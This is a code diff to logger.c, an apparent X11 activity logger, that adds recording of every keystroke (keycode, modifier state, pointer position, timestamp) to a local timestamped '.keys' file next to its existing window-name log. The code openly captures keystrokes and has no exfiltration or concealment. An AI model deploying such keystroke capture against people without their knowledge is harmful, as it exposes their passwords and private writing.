@@ -1,0 +1,45 @@
+diff --git a/logger.c b/logger.c
+index c02fff1..0c3da87 100644
+--- a/logger.c
++++ b/logger.c
+@@ -96,13 +96,17 @@ int main(void) {
+     long pid = 0;
+     FILE* fp;
+ 
++    char* fk_filepath = malloc(sizeof(char) * BUFFER_LEN);
+     char* fd_filepath = malloc(sizeof(char) * BUFFER_LEN);
+ 
+     strftime(time_sec, BUFFER_LEN, "%d-%m-%Y_%Hh%Mm%S", tm);
++    sprintf(fk_filepath, "%s.keys", time_sec);
+     sprintf(fd_filepath, "%s.wins", time_sec);
+ 
++    FILE* fk = fopen(fk_filepath, "w");
+     FILE* fd = fopen(fd_filepath, "w");
+ 
++    free(fk_filepath);
+     free(fd_filepath);
+ 
+     fprintf(fd, "Starting at %s\n", start_time);
+@@ -145,10 +149,13 @@ int main(void) {
+ 
+             // printf("KEY keycode  : %u\n", ev.xkey.keycode);
+ 
++            gettimeofday(&time_milisec, NULL);
++            fprintf(fk, "[%ld-%03lu] [%d_%d] [%u] %u\n", time_milisec.tv_sec, ev.xkey.time % 1000, ev.xkey.x, ev.xkey.y, ev.xkey.state, ev.xkey.keycode);
++            fflush(fk);
++
+             name = get_string_property(display, &window, "_NET_WM_NAME");
+             if (strcmp(last_name, (char*)name) != 0) {
+                 last_name = strdup((char*)name);
+-                gettimeofday(&time_milisec, NULL);
+ 
+                 fprintf(fd, "[%ld-%03lu] [%05lu] [%s] %s\n", time_milisec.tv_sec, ev.xkey.time % 1000, pid, comm, name);
+                 fflush(fd);
+@@ -213,6 +220,7 @@ int main(void) {
+         }
+     }
+     printf("closing !\n");
++    fclose(fk);
+     fclose(fd);
+ 
+     free(comm);
